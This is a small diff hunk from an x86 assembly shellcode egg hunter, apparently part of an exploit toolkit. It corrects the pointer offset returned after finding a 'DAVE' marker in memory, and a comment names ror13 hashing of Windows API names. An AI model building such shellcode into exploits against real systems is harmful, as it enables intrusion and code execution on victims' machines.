@@ -172,7 +172,7 @@ find_egg:
         cmp dword ptr ds:[edi+4], eax           ; check for "DAVE" again
         jne find_egg                            ; loop if not found
 matched:
-        lea ebx,[edi-sp_egg-4]                  ; return the adjusted place we found
+        lea ebx,[edi-sp_egg]                    ; return the adjusted place we found
         ret
 
 ; we use the ror13 hash for the name of the API functions to not push the whole string of the api onto the stack,
